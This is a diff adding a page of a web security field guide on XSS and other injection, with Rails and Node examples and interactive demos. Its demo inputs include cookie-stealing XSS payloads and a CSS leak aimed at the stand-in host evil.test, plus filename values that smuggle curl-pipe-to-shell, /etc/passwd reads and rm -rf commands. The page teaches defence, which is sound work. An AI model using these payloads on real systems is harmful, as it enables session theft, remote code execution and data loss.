@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="en" data-lang="rails">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>04 XSS and Other Injection · Web Security</title>
+
+<link rel="icon" href="favicon.ico" sizes="32x32">
+<link rel="icon" href="favicon.svg" type="image/svg+xml">
+<link rel="apple-touch-icon" href="apple-touch-icon.png">
+<link rel="manifest" href="site.webmanifest">
+<meta name="theme-color" content="#000000">
+<link rel="stylesheet" href="assets/site.css?v=8f1e007517">
+<script src="assets/consent.js?v=9320b4a322"></script>
+</head>
+<body data-slug="04-xss-and-other-injection">
+<div class="win">
+  <div class="titlebar"><span class="dots"><i></i><i></i><i></i></span><span class="t">guest@websec: ~/websec/04-xss-and-other-injection — zsh — 100×40</span>
+    <a class="by" href="about.html" title="About the author"><span class="w0">by </span>SaKKo</a>
+    <span class="lsw" role="group" aria-label="Language"><a href="04-xss-and-other-injection.html" aria-current="true" data-setlang="en">EN</a><a href="th/04-xss-and-other-injection.html" data-setlang="th">TH</a></span>
+    <span class="langsw" role="group" aria-label="Code examples language"><span class="d">code:</span><button type="button" data-l="rails">rails</button><button type="button" data-l="node">node</button></span></div>
+  <nav class="top" aria-label="Sections"><a href="index.html" title="Web Security Field Guide">~/</a>
+<a class="trk on" href="index.html#security">#1 security</a>
+<a class="trk" href="r01-rails-api-app.html">#2 rails</a>
+<span class="grp">|</span>
+<a href="01-introduction.html" title="Introduction">01·introduction</a>
+<a href="02-sql-injection.html" title="SQL Injection">02·sql-injection</a>
+<a href="03-unsafe-query-generation.html" title="Unsafe Query Generation">03·query-shape</a>
+<a href="04-xss-and-other-injection.html" aria-current="page" title="XSS and Other Injection">04·xss</a>
+<span class="grp">| accounts:</span>
+<a href="05-authentication.html" title="Authentication">05·auth</a>
+<a href="05b-mfa.html" title="Multi-Factor Authentication">05b·mfa</a>
+<a href="06-sessions.html" title="Sessions">06·sessions</a>
+<a href="07-csrf.html" title="Cross-Site Request Forgery">07·csrf</a>
+<a href="08-user-management.html" title="User Management">08·accounts</a>
+<a href="09-mass-assignment-and-authorization.html" title="Mass Assignment and Authorization">09·authz</a>
+<span class="grp">| browser:</span>
+<a href="10-redirection-and-files.html" title="Redirection and Files">10·files</a>
+<a href="11-http-security-headers.html" title="HTTP Security Headers">11·headers</a>
+<a href="12-transport-cookies-third-party.html" title="Transport, Cookies and Third-Party Scripts">12·cookies-tls</a>
+<span class="grp">| server:</span>
+<a href="13-ssrf.html" title="Server-Side Request Forgery">13·ssrf</a>
+<a href="14-deserialization-and-xxe.html" title="Deserialization and XXE">14·deserialize</a>
+<a href="15-environmental-security.html" title="Environmental Security">15·secrets</a>
+<a href="16-cryptography.html" title="Cryptography and Data Protection">16·crypto</a>
+<a href="17-dependencies-and-cves.html" title="Dependencies and CVEs">17·dependencies</a>
+<span class="grp">| ops:</span>
+<a href="18-intranet-and-admin.html" title="Intranet and Admin Security">18·admin</a>
+<a href="19-misconfiguration-and-errors.html" title="Misconfiguration and Error Handling">19·misconfig</a>
+<a href="20-insecure-design.html" title="Insecure Design and Business Logic">20·design</a>
+<a href="21-logging-and-incident-response.html" title="Logging, Alerting and Incident Response">21·logging</a>
+<a href="22-additional-resources.html" title="Additional Resources">22·resources</a>
+<span class="grp">| questionnaires:</span>
+<a href="q1-developer-survey.html" title="Developer Security Survey">Q1·developer</a>
+<a href="q2-awareness-survey.html" title="Cyber Threat Awareness Survey">Q2·cyber</a></nav>
+  <main>
+<div class="col">
+<p class="prompt">guest@websec ~ % <b>man 04-xss-and-other-injection</b></p>
+<h1>04 · XSS and Other Injection</h1>
+<p class="lede">Section 02 covered SQL. The same bug shows up anywhere data gets run as code: HTML and JavaScript (XSS), CSS, Markdown, shell commands and HTTP headers. The fix always depends on where the data lands.</p>
+<div class="toc"><b>on this page</b><ol>
+<li><a href="#lists">Allowlists vs blocklists</a></li><li><a href="#xss">Cross-site scripting (XSS)</a></li><li><a href="#css">CSS injection</a></li><li><a href="#markup">Markup injection (Markdown, Textile…)</a></li><li><a href="#ajax">Ajax / API response injection</a></li><li><a href="#cmd">Command-line injection</a></li><li><a href="#header">Header injection</a></li></ol></div>
+<h2 id="lists">4.1 Allowlists vs blocklists</h2>
+<p>Always list what's <b>allowed</b>, not what's forbidden. A blocklist has to predict every attack ever. An allowlist just describes what's normal.</p>
+<ul>
+<li>Require login everywhere by default, then list the few public pages. Not the other way round. Rails: <code>before_action :require_login, except: [:index]</code>.</li>
+<li>Allow a few safe HTML tags instead of trying to strip <code>&lt;script&gt;</code>.</li>
+<li>Don't "fix" bad input, reject it. Strip <code>&lt;script&gt;</code> from <code>&lt;sc&lt;script&gt;ript&gt;</code> and you've built a new one.</li>
+</ul>
+<div class="demo"><header><b>sim: the self-healing payload</b><span>a blocklist that removes &lt;script&gt;</span></header><div class="body">
+<label for="bl-in">input</label><input id="bl-in" type="text" value="&lt;sc&lt;script&gt;ript&gt;alert(1)&lt;/sc&lt;/script&gt;ript&gt;"/>
+<div class="grid2" style="margin-top:10px"><div class="box"><p class="cap r">blocklist: remove "&lt;script&gt;" / "&lt;/script&gt;" once</p><div class="out" id="bl-a"></div></div><div class="box"><p class="cap g">allowlist: escape everything, allow nothing</p><div class="out" id="bl-b"></div></div></div>
+</div></div>
+<h2 id="xss">4.2 Cross-site scripting (XSS)</h2>
+<p>XSS means an attacker's JavaScript runs on <i>our</i> site in someone else's browser. It can do anything that user can. It's one of the most common web bugs, and it beats CSRF protection too, because the script can read the CSRF token from the page.</p>
+<h3>Entry points</h3>
+<p>Anything a user can influence that ends up on a page: form fields, URL params, filenames, even headers shown in admin. Three kinds:</p>
+<ul>
+<li><b>Stored</b>: saved (like a comment) and runs for everyone who views it.</li>
+<li><b>Reflected</b>: hidden in a link, runs for whoever clicks.</li>
+<li><b>DOM-based</b>: our own JavaScript copies attacker input into the page, so the server never sees it (covered further down).</li>
+</ul>
+<h3>What injected script can do</h3>
+<p><b>Steal cookies</b>, unless they're <code>HttpOnly</code>. Even then the script can act as the user.</p>
+<p><b>Fake the page</b>: drop a fake login box on our real domain.</p>
+<div class="anim" data-actors="Attacker|Rails app|Database|Victim's browser|evil.test" data-title="Stored XSS"><script type="application/json">[{"f": 0, "t": 1, "l": "comment: <img src=x onerror=…>", "k": "a", "c": "The attacker posts a comment containing HTML with a JavaScript event handler."}, {"f": 1, "t": 2, "l": "INSERT comment", "c": "Storing it is fine. The danger is in how it's displayed."}, {"f": 3, "t": 1, "l": "GET /posts/7", "c": "Later, any user views the post."}, {"f": 1, "t": 3, "l": "<%= raw comment.body %>", "k": "a", "c": "A view uses <code>raw<\/code> or <code>html_safe<\/code>, so the HTML goes out unescaped."}, {"n": 3, "l": "onerror runs on our origin", "k": "a", "c": "The browser runs the script as if we wrote it: it can read the page and call our APIs as the victim."}, {"f": 3, "t": 4, "l": "GET /?c=document.cookie", "k": "a", "c": "Classic payload: send cookies or tokens to the attacker. <code>HttpOnly<\/code> hides the session cookie but not everything else."}, {"n": 1, "l": "<%= comment.body %>  (default)", "k": "k", "c": "With Rails' default escaping the browser shows the text <code>&lt;img src=x …&gt;<\/code> literally. Nothing runs."}]</script></div>
+<div class="demo"><header><b>sim: XSS playground</b><span>what the browser would do with a comment</span></header><div class="body">
+<p class="hint">Type a comment as an attacker. We'll show what a browser would do with it, without running anything.</p>
+<label for="xs-in">comment body</label><textarea id="xs-in">Nice post! &lt;img src=x onerror="fetch('https://evil.test/?c='+document.cookie)"&gt;</textarea>
+<div class="row" style="margin-top:8px"><span class="d">payloads:</span>
+<button class="btn" data-xs='Thanks, &lt;b&gt;very&lt;/b&gt; helpful! See &lt;a href="https://example.test"&gt;this&lt;/a&gt;.' type="button">harmless formatting</button>
+<button class="btn" data-xs="&lt;script&gt;new Image().src='https://evil.test/?c='+document.cookie&lt;/script&gt;" type="button">&lt;script&gt;</button>
+<button class="btn" data-xs="&lt;img src=x onerror=&quot;fetch('https://evil.test/?c='+document.cookie)&quot;&gt;" type="button">img onerror</button>
+<button class="btn" data-xs='&lt;a href="javascript:alert(document.domain)"&gt;click for prize&lt;/a&gt;' type="button">javascript: link</button>
+<button class="btn" data-xs='&lt;iframe src="https://evil.test/fake-login" style="position:fixed;inset:0;width:100%;height:100%;border:0"&gt;&lt;/iframe&gt;' type="button">defacement iframe</button>
+<button class="btn" data-xs="&lt;img src=x onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&gt;" type="button">entity-encoded</button>
+<button class="btn" data-xs="&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x&gt;&lt;/svg&gt;" type="button">svg event</button>
+</div>
+<div class="row" style="margin-top:8px"><label><input id="xs-httponly" type="checkbox"/> session cookie is <code>HttpOnly</code></label></div>
+<div class="grid3" style="margin-top:10px">
+<div class="box"><p class="cap r">raw: element.innerHTML = comment</p><div class="out" id="xs-raw"></div></div>
+<div class="box"><p class="cap g">escaped: template auto-escape</p><div class="out" id="xs-esc"></div></div>
+<div class="box"><p class="cap y">sanitized: allowlist b, i, a[href=https]</p><div class="out" id="xs-san"></div><p class="cap" style="margin-top:8px">rendered</p><div id="xs-render" style="border:1px dashed var(--faint);padding:6px"></div></div>
+</div>
+</div></div>
+<h3>Countermeasures</h3>
+<ol>
+<li><b>Escape output.</b> Templates do it for you. Bugs come from the escape hatches: <code>raw</code>, <code>html_safe</code>, <code>innerHTML</code>.</li>
+<li><b>Match the context.</b> Never drop data into <code>&lt;script&gt;</code> or <code>onclick</code>; use <code>data-*</code> attributes.</li>
+<li><b>Need user HTML? Sanitize with a library</b> (Rails' <code>sanitize</code>, DOMPurify). Never with regex.</li>
+<li><b>Check URLs</b> start with http(s).</li>
+<li><b>Add CSP</b> as a safety net.</li>
+</ol>
+<div class="code">
+<pre data-lang="rails">&lt;%= comment.body %&gt;                     <span class="ok">&lt;%# escaped automatically %&gt;</span>
+<span class="bad">&lt;%= raw comment.body %&gt;                 &lt;%# XSS %&gt;</span>
+<span class="bad">&lt;%= comment.body.html_safe %&gt;           &lt;%# XSS: html_safe means "trust me" %&gt;</span>
+<span class="bad">&lt;%== comment.body %&gt;                    &lt;%# same as raw %&gt;</span>
+
+&lt;%# HTML required: Rails' allowlist sanitizer (rails-html-sanitizer / Loofah) %&gt;
+&lt;%= sanitize comment.body, tags: %w[b i em strong a p], attributes: %w[href] %&gt;
+
+&lt;%# user-supplied links: validate the scheme yourself %&gt;
+&lt;%= link_to "website", user.website if user.website.to_s.match?(%r{\Ahttps?://}) %&gt;</pre>
+<pre data-lang="node"><span class="ok">// browser: textContent never parses HTML</span>
+li.textContent = comment.body;
+<span class="bad">li.innerHTML = comment.body;         // XSS</span>
+
+<span class="ok">// when HTML is required: DOMPurify (browser) or sanitize-html (Node)</span>
+import DOMPurify from "dompurify";
+div.innerHTML = DOMPurify.sanitize(userHtml,
+  { ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p"], ALLOWED_ATTR: ["href"] });
+
+<span class="c">// server templates (EJS): &lt;%= x %&gt; escapes, &lt;%- x %&gt; does NOT</span></pre>
+</div>
+<div class="rp partial"><code>&lt;%= %&gt;</code> escapes for you. Watch for <code>raw</code>, <code>html_safe</code> and <code>&lt;%==</code>. <code>link_to</code> doesn't block <code>javascript:</code> URLs, and Rails can't protect JS you write yourself. Grep for <code>html_safe</code> and <code>innerHTML</code>.</div>
+<h3>Obfuscation and encoding tricks</h3>
+<p>Browsers are forgiving: they decode entities, ignore odd casing, run handlers on dozens of tags. String filters always miss something. Real sanitizers parse the HTML first.</p>
+<h3>Output encoding depends on context</h3>
+<p>There's no single "escape" function. Encoding depends on <b>where</b> the data lands. Try it:</p>
+<div class="demo"><header><b>sim: one value, five contexts</b><span>what the template produces and whether it's safe</span></header><div class="body">
+<label for="cx-in">user-controlled value</label><input id="cx-in" type="text" value='x" onmouseover="alert(1)'/>
+<div class="row" style="margin-top:8px"><span class="d">try:</span>
+<button class="btn" data-cx="Ana O'Brien" type="button">Ana O'Brien</button>
+<button class="btn" data-cx='x" onmouseover="alert(1)' type="button">attribute breakout</button>
+<button class="btn" data-cx="x onmouseover=alert(1)" type="button">unquoted breakout</button>
+<button class="btn" data-cx="&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;" type="button">&lt;/script&gt; breakout</button>
+<button class="btn" data-cx="javascript:alert(1)" type="button">javascript: URL</button>
+<button class="btn" data-cx="red;background:url(//evil.test/leak)" type="button">CSS value</button>
+</div>
+<div class="tablewrap" style="margin-top:10px"><table><thead><tr><th>context</th><th>template</th><th>output</th><th>verdict</th></tr></thead><tbody id="cx-out"></tbody></table></div>
+</div></div>
+<div class="code">
+<pre data-lang="rails">&lt;p&gt;&lt;%= name %&gt;&lt;/p&gt;                              <span class="c">&lt;%# HTML body: ERB escapes %&gt;</span>
+&lt;div title="&lt;%= name %&gt;"&gt;                       <span class="c">&lt;%# quoted attribute: escaped. Always quote! %&gt;</span>
+&lt;%= tag.div data: { user: @user.as_json } %&gt;     <span class="ok">&lt;%# pass data to JS via data-* (JSON, escaped) %&gt;</span>
+&lt;a href="/search?q=&lt;%= ERB::Util.url_encode(q) %&gt;"&gt;   <span class="c">&lt;%# URL parameter: url-encode the value %&gt;</span>
+<span class="bad">&lt;script&gt;const n = "&lt;%= j name %&gt;"&lt;/script&gt;     &lt;%# works, but a fragile context: avoid %&gt;</span>
+<span class="bad">&lt;div style="color: &lt;%= color %&gt;"&gt;                &lt;%# CSS: allowlist values only %&gt;</span></pre>
+<pre data-lang="node"><span class="c">// browser: pick the API that treats data as data</span>
+el.textContent = name;                          <span class="ok">// HTML body</span>
+el.setAttribute("title", name);                 <span class="ok">// attribute (fixed name)</span>
+el.dataset.user = JSON.stringify(user);         <span class="ok">// data for scripts</span>
+url.searchParams.set("q", q);                   <span class="ok">// URL parameter (encodeURIComponent)</span>
+el.style.setProperty("color", allowedColors.includes(c) ? c : "black");  <span class="ok">// CSS via CSSOM + allowlist</span>
+<span class="bad">el.setAttribute("onclick", userCode);            // event handlers: never</span></pre>
+</div>
+<h3>Contexts encoding can't save</h3>
+<p>Some places are never safe for user data, however you encode: inside <code>&lt;script&gt;</code>, <code>&lt;style&gt;</code>, event handlers or <code>eval()</code>. Put the data in a data attribute and read it from there.</p>
+<h3>DOM-based XSS: sources and sinks</h3>
+<p>Some XSS happens entirely in the browser: our JS reads the URL and writes it into the page. The part after <code>#</code> never reaches the server, so server-side defenses never see it.</p>
+<div class="tablewrap"><table><thead><tr><th>sources (attacker can control)</th><th>dangerous sinks (parse or run code)</th><th>safe sinks (treat input as text)</th></tr></thead><tbody>
+<tr><td><code>location.hash</code>, <code>location.search</code>, <code>document.URL</code>, <code>document.referrer</code>, <code>window.name</code>, <code>postMessage</code> data, <code>localStorage</code>, API responses with user content</td><td><code>innerHTML</code>, <code>outerHTML</code>, <code>insertAdjacentHTML</code>, <code>document.write</code>, <code>eval</code>, <code>setTimeout(string)</code>, <code>new Function</code>, <code>el.href/src = "javascript:…"</code>, jQuery <code>$(html)</code> / <code>.html()</code>, <code>createElement(userTag)</code></td><td><code>textContent</code>, <code>insertAdjacentText</code>, <code>createTextNode</code>, <code>value</code>, <code>className</code>, <code>setAttribute</code> with a fixed, non-event attribute name</td></tr>
+</tbody></table></div>
+<div class="anim" data-actors="Attacker|Victim's browser|app.example.com" data-title="DOM-based XSS"><script type="application/json">[{"f": 0, "t": 1, "l": "link: app.example.com/welcome#<img src=x onerror=…>", "k": "a", "c": "The payload sits in the fragment, after the <code>#<\/code>."}, {"f": 1, "t": 2, "l": "GET /welcome  (fragment NOT sent)", "c": "Browsers never send the fragment. Server logs show a normal request."}, {"f": 2, "t": 1, "l": "static HTML + welcome.js", "c": "The server's response is identical for everyone, and fully escaped."}, {"n": 1, "l": "el.innerHTML = 'Hi ' + location.hash.slice(1)", "k": "a", "c": "Our own JavaScript copies the fragment into <code>innerHTML<\/code>: source → dangerous sink."}, {"n": 1, "l": "onerror runs on app.example.com", "k": "a", "c": "<b>XSS<\/b>, with nothing for server-side defenses to catch."}, {"n": 1, "l": "fix: el.textContent = …  or Trusted Types", "k": "k", "c": "A safe sink shows the text literally. Trusted Types make the browser reject plain strings in <code>innerHTML<\/code>."}]</script></div>
+<div class="demo"><header><b>sim: source → sink</b><span>front-end code reading location.hash</span></header><div class="body">
+<label for="dom-in">URL fragment (after #)</label><input id="dom-in" type="text" value="&lt;img src=x onerror=alert(document.domain)&gt;"/>
+<div class="grid2" style="margin-top:10px">
+<div class="box"><p class="cap r">el.innerHTML = "Hi " + hash</p><div class="out" id="dom-a"></div></div>
+<div class="box"><p class="cap g">el.textContent = "Hi " + hash</p><div class="out" id="dom-b"></div></div>
+</div></div></div>
+<h3>Trusted Types</h3>
+<p>Turn it on via CSP and the browser refuses plain strings in <code>innerHTML</code>. Only code that goes through your approved policy (say, DOMPurify) gets in.</p>
+<div class="code">
+<pre data-lang="rails"><span class="c"># config/initializers/content_security_policy.rb</span>
+policy.require_trusted_types_for :script
+policy.trusted_types "dompurify", "default"</pre>
+<pre data-lang="node"><span class="c">// Content-Security-Policy: require-trusted-types-for 'script'; trusted-types dompurify</span>
+const policy = trustedTypes.createPolicy("dompurify", {
+  createHTML: (s) =&gt; DOMPurify.sanitize(s),
+});
+el.innerHTML = policy.createHTML(userHtml);   <span class="ok">// allowed</span>
+<span class="bad">el.innerHTML = userHtml;                      // TypeError: requires TrustedHTML</span></pre>
+</div>
+<h3>Anti-patterns to avoid</h3>
+<ul>
+<li><b>Relying on CSP alone.</b> It's a safety net, not the fix.</li>
+<li><b>"Cleaning" all input on save.</b> Wrong context, double-encoding, misses browser-only XSS. Escape at output instead.</li>
+<li><b>Trusting a WAF.</b> Nice extra, never the fix.</li>
+<li><b>Editing HTML after sanitizing.</b> Sanitize last.</li>
+</ul>
+<h3>Examples from the underground</h3>
+<p>Two famous ones:</p>
+<ul>
+<li><b>Yahoo! Mail worm (2006)</b>: an email that mailed itself to all your contacts when opened. The filter removed the bad bit once, which rebuilt it.</li>
+<li><b>MySpace "Samy" worm (2005)</b>: a million profiles infected in about 20 hours, using script hidden in CSS.</li>
+</ul>
+<h2 id="css">4.3 CSS injection</h2>
+<p>Letting users paste raw CSS is risky, even though CSS isn't code:</p>
+<ul>
+
+<li>It can <b>leak data</b>, one character at a time, via selectors and background URLs.</li>
+<li>It can <b>fake the page</b>: hide things, overlay a fake login.</li>
+</ul>
+<p>Fix: offer choices (color picker, font list) and generate the CSS ourselves.</p>
+<div class="demo"><header><b>sim: user profile theme</b><span>raw CSS vs generated CSS</span></header><div class="body">
+<div class="grid2">
+<div class="box"><p class="cap r">"paste your CSS"</p><textarea id="css-raw" rows="5">input[name=csrf][value^="a"] { background: url(https://evil.test/leak?c=a) }
+.logout { display: none }
+body::after { content: "Session expired. Re-enter password below"; position: fixed; inset: 0; background: #fff }</textarea><div class="out" id="css-raw-out" style="margin-top:8px"></div></div>
+<div class="box"><p class="cap g">pick a theme</p>
+<label for="css-bg">background</label><input id="css-bg" type="text" value="#102030"/>
+<label for="css-fg">text color</label><input id="css-fg" type="text" value="red; } body { display:none"/>
+<div class="out" id="css-gen-out" style="margin-top:8px"></div></div>
+</div>
+</div></div>
+<h2 id="markup">4.4 Markup injection (Markdown, Textile, BBCode)</h2>
+<p>Most Markdown renderers let raw HTML through and turn <code>[x](javascript:…)</code> into a working link. Render the Markdown, <b>then</b> sanitize the HTML.</p>
+<div class="demo"><header><b>sim: Markdown renderer</b><span>mini renderer: **bold**, [links](url), raw HTML</span></header><div class="body">
+<label for="md-in">markdown</label><textarea id="md-in" rows="3">**Hello!** Check out [my site](javascript:fetch('//evil.test?c='+document.cookie)) and &lt;img src=x onerror=alert(1)&gt;</textarea>
+<div class="row" style="margin-top:8px"><label><input id="md-nohtml" type="checkbox"/> renderer option: disable raw HTML</label><label><input id="md-san" type="checkbox"/> sanitize output with allowlist</label></div>
+<div class="grid2" style="margin-top:10px"><div class="box"><p class="cap">rendered HTML</p><div class="out" id="md-out"></div></div><div class="box"><p class="cap">verdict</p><div class="out" id="md-verdict"></div></div></div>
+</div></div>
+<div class="code">
+<pre data-lang="rails"><span class="c"># gem "commonmarker": raw HTML is omitted by default (unsafe: false)</span>
+html = Commonmarker.to_html(params[:body])
+safe = Rails::HTML5::SafeListSanitizer.new.sanitize(html)   <span class="c"># render, then sanitize</span>
+&lt;%= sanitize markdown_html %&gt;                              &lt;%# same idea in views %&gt;</pre>
+<pre data-lang="node">import { marked } from "marked";
+import DOMPurify from "isomorphic-dompurify";
+const html = DOMPurify.sanitize(marked.parse(userMarkdown));   <span class="ok">// render, then sanitize</span></pre>
+</div>
+<div class="rp partial">Use <code>sanitize</code> on Markdown output. Action Text sanitizes for you. Don't enable raw-HTML options in Markdown gems.</div>
+<h2 id="ajax">4.5 Ajax / API response injection</h2>
+<p>XSS sneaks in where templates aren't used: an endpoint that builds HTML by gluing strings, or JS that puts API data into <code>innerHTML</code>.</p>
+<div class="code">
+<pre data-lang="rails"><span class="bad"># hand-built HTML string: no escaping happens here</span>
+render html: "&lt;li&gt;#{user.display_name}&lt;/li&gt;".html_safe
+
+<span class="ok"># render a partial (escaped) or return JSON</span>
+render partial: "users/chip", locals: { user: }   <span class="c"># &lt;li&gt;&lt;%= user.display_name %&gt;&lt;/li&gt;</span>
+render json: { name: user.display_name }          <span class="c"># client uses textContent</span>
+<span class="c"># plain Ruby: helpers.tag.li(user.display_name) or ERB::Util.html_escape(name)</span></pre>
+<pre data-lang="node"><span class="bad">// server builds HTML by hand, client inserts it</span>
+app.get("/api/user-chip", (req, res) =&gt; res.send(`&lt;li&gt;${user.displayName}&lt;/li&gt;`));
+list.insertAdjacentHTML("beforeend", await (await fetch("/api/user-chip")).text());
+
+<span class="ok">// return data, let the client build DOM safely</span>
+app.get("/api/user", (req, res) =&gt; res.json({ name: user.displayName }));
+const li = document.createElement("li");
+li.textContent = (await (await fetch("/api/user")).json()).name;
+list.append(li);</pre>
+</div>
+<div class="rp partial"><code>render json:</code> is safe. <code>render html:</code> with interpolated strings isn't.</div>
+<h2 id="cmd">4.6 Command-line injection</h2>
+<p>Build a shell command as one string and the shell reads <code>;</code>, <code>|</code> and <code>$( )</code> as "run more stuff". <code>photo.jpg; rm -rf /</code> is two commands.</p>
+<p>Fix: <b>skip the shell</b>. Pass the program and its arguments separately.</p>
+<div class="demo"><header><b>sim: thumbnail generator</b><span>how a shell would split the command</span></header><div class="body">
+<label for="cm-in">uploaded filename</label><input id="cm-in" type="text" value="cat.jpg; curl https://evil.test/x.sh | sh"/>
+<div class="row" style="margin-top:8px"><span class="d">try:</span><button class="btn" data-cm="cat.jpg" type="button">cat.jpg</button><button class="btn" data-cm="cat.jpg; curl https://evil.test/x.sh | sh" type="button">; curl | sh</button><button class="btn" data-cm="$(cat /etc/passwd).jpg" type="button">$( )</button><button class="btn" data-cm="a.jpg &amp;&amp; rm -rf ~" type="button">&amp;&amp; rm</button><button class="btn" data-cm="--help" type="button">--help (option injection)</button></div>
+<div class="grid2" style="margin-top:10px">
+<div class="box"><p class="cap r">exec("convert " + name + " -resize 200 thumb.png")</p><div class="out" id="cm-a"></div></div>
+<div class="box"><p class="cap g">execFile("convert", ["--", name, "-resize", "200", "thumb.png"])</p><div class="out" id="cm-b"></div></div>
+</div>
+</div></div>
+<div class="code">
+<pre data-lang="rails"><span class="bad">system("convert #{name} -resize 200 thumb.png")   # one string → /bin/sh</span>
+<span class="bad">`convert #{name}`  /  %x(convert #{name})  /  open("| #{cmd}")   # shell</span>
+<span class="ok">system("convert", name, "-resize", "200", "thumb.png")       # argv, no shell</span>
+<span class="ok">out, status = Open3.capture2e("convert", name, "-resize", "200", "thumb.png")</span>
+File.open(path)        <span class="c"># not Kernel#open(path), which runs "| cmd"</span></pre>
+<pre data-lang="node">const { execFile } = require("node:child_process");
+<span class="bad">exec(`convert ${name} -resize 200 thumb.png`);           // shell parses name</span>
+<span class="ok">execFile("convert", [name, "-resize", "200", "thumb.png"], cb);  // no shell</span>
+<span class="c">// also unsafe: spawn(cmd, { shell: true }), execSync(string)</span></pre>
+</div>
+<div class="rp no"><code>system("convert", name)</code> is safe. <code>system("convert #{name}")</code>, backticks and <code>%x()</code> are not.</div>
+<h3>Sneaky one: <code>Kernel#open</code></h3>
+<p><code>open("| ls")</code> runs <code>ls</code>. So "opening a file" with a user-supplied name can run commands. Ruby 3.3 deprecated this, but plenty of apps still run older Ruby. Use <code>File.open</code>.</p>
+<h2 id="header">4.7 Header injection</h2>
+<p>Headers are lines of text. If user input with a line break lands in one, the attacker can add their own headers, or even a whole fake page.</p>
+<div class="demo"><header><b>sim: raw HTTP response</b><span>user input lands in a Location header</span></header><div class="body">
+<label for="hd-in">GET /go?to= (URL-decoded value shown with \r\n visible)</label><input id="hd-in" type="text" value="/home\r\nSet-Cookie: sid=attacker-chosen\r\n\r\n&lt;script&gt;alert(1)&lt;/script&gt;"/>
+<div class="row" style="margin-top:8px"><button class="btn" data-hd="/home" type="button">normal</button><button class="btn" data-hd="/home\r\nSet-Cookie: sid=attacker-chosen" type="button">inject cookie</button><button class="btn" data-hd="/home\r\nSet-Cookie: sid=attacker-chosen\r\n\r\n&lt;script&gt;alert(1)&lt;/script&gt;" type="button">response splitting</button><label><input id="hd-fix" type="checkbox"/> reject CR/LF (modern frameworks do)</label></div>
+<div class="out" id="hd-out" style="margin-top:10px"></div>
+</div></div>
+<p>Modern frameworks reject line breaks in headers. Custom header code should too.</p>
+
+<div class="rp yes">Rails and modern app servers like Puma already reject line breaks in header values.</div>
+<h3>DNS rebinding and Host header attacks</h3>
+<p>Apps often build email links from the request's <code>Host</code> header, which the client controls. Send <code>Host: evil.test</code> with a reset request and the victim gets a real email with a link to evil.test.</p>
+
+<p><b>DNS rebinding</b> is a related trick. The attacker's domain first points at their own server, then switches to an internal address like <code>127.0.0.1</code>, so a victim's browser ends up talking to a service on the victim's own machine or network. Those requests still carry the attacker's hostname in <code>Host</code>.</p>
+<p>Fix for both: allowlist your hostnames (reject unknown <code>Host</code> values), and build email links from config.</p>
+<div class="code">
+<pre data-lang="rails"><span class="c"># config/environments/production.rb: HostAuthorization (dev-only by default)</span>
+config.hosts = ["app.example.com", "www.example.com"]
+config.host_authorization = { exclude: -&gt;(req) { req.path == "/up" } }   <span class="c"># health check</span>
+
+<span class="c"># build email links from config, never from request.host</span>
+config.action_mailer.default_url_options = { host: "app.example.com", protocol: "https" }</pre>
+<pre data-lang="node">const ALLOWED = new Set(["app.example.com", "www.example.com"]);
+app.use((req, res, next) =&gt; ALLOWED.has(req.hostname) ? next() : res.sendStatus(400));
+<span class="ok">// build links from config, never from req.headers.host</span>
+const resetUrl = new URL(`/reset?token=${token}`, process.env.APP_BASE_URL);</pre>
+</div>
+<div class="rp partial"><code>config.hosts</code> is only on in development. Set it in <code>production.rb</code>, along with <code>action_mailer.default_url_options</code>.</div>
+</div>
+
+<div class="col"><label class="readmark"><input type="checkbox" id="read-04-xss-and-other-injection"> mark section 04 as read</label><div class="pager"><a href="03-unsafe-query-generation.html">◀ 03 Unsafe Query Generation</a><a href="05-authentication.html">05 Authentication ▶</a></div></div>
+  </main>
+  <footer class="site">Based on the <a href="https://guides.rubyonrails.org/security.html">Ruby on Rails Security Guide</a> (CC BY-SA 4.0), the <a href="https://cheatsheetseries.owasp.org/">OWASP Cheat Sheet Series</a>, the <a href="https://owasp.org/Top10/2025/">OWASP Top 10:2025</a> and <a href="https://infosec.mozilla.org/guidelines/web_security.html">Mozilla's Web Security Guidelines</a>. Written for our dev team; code samples are illustrative.</footer>
+</div>
+<script src="assets/site.js?v=92ac7aa3f8"></script>
+<script>
+
+// 7.1 blocklist
+function bl() { const v = $("#bl-in").value; const a = v.replace(/<script>/i, "").replace(/<\/script>/i, ""); $("#bl-a").innerHTML = esc(a) + (/<script>/i.test(a) ? '\n<span class="r">a working &lt;script&gt; tag reassembled</span>' : ""); $("#bl-b").innerHTML = esc(esc(v)) + '\n<span class="g">browser shows it as text</span>'; }
+$("#bl-in").addEventListener("input", bl); bl();
+
+
+// 7.3 XSS analysis
+function analyze(html) {
+  const doc = new DOMParser().parseFromString(`<body>${html}</body>`, "text/html"), found = [];
+  doc.body.querySelectorAll("*").forEach(el => {
+    const tag = el.tagName.toLowerCase();
+    if (tag === "script") found.push(`&lt;script&gt; runs: ${esc(el.textContent.trim().slice(0, 90))}`);
+    if (["iframe", "object", "embed", "frame"].includes(tag)) found.push(`&lt;${tag}&gt; loads ${esc(el.getAttribute("src") || el.getAttribute("data") || "")}${/fixed|absolute/.test(el.getAttribute("style") || "") ? " covering the whole page" : ""}`);
+    for (const a of el.attributes) {
+      if (/^on/i.test(a.name)) found.push(`${tag}.${a.name} runs: ${esc(a.value.slice(0, 90))}`);
+      if (["href", "src", "action", "formaction", "xlink:href"].includes(a.name.toLowerCase()) && /^\s*javascript:/i.test(a.value)) found.push(`${tag} ${a.name} runs on click: ${esc(a.value.slice(0, 90))}`);
+    }
+  });
+  return { doc, found };
+}
+function sanitize(doc) {
+  const allowed = { B: [], I: [], EM: [], STRONG: [], P: [], BR: [], A: ["href"] };
+  const out = document.createElement("div");
+  (function walk(src, dst) {
+    for (const n of Array.from(src.childNodes)) {
+      if (n.nodeType === 3) { dst.appendChild(document.createTextNode(n.nodeValue)); continue; }
+      if (n.nodeType !== 1) continue;
+      if (["SCRIPT", "STYLE", "IFRAME", "OBJECT", "EMBED", "TEMPLATE"].includes(n.tagName)) continue;
+      if (allowed[n.tagName]) {
+        const e = document.createElement(n.tagName);
